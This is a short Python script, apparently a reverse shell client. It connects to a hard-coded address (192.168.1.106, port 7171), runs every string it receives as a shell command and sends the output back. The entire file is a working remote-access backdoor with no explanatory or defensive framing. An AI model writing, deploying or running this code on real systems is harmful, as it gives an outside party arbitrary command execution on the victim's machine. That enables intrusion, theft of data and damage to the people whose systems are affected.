#! /usr/bin/env python
# encoding:utf-8 
import socket
import subprocess

socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket_connection.connect(("192.168.1.106", 7171))

while True:
    code = socket_connection.recv(2048)
    decode_code = code.decode()
    
    if decode_code == "0":
        break
    
    else:
        command = subprocess.Popen(decode_code, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = command.stdout.read() + command.stderr.read()
        socket_connection.send(result)

socket_connection.close()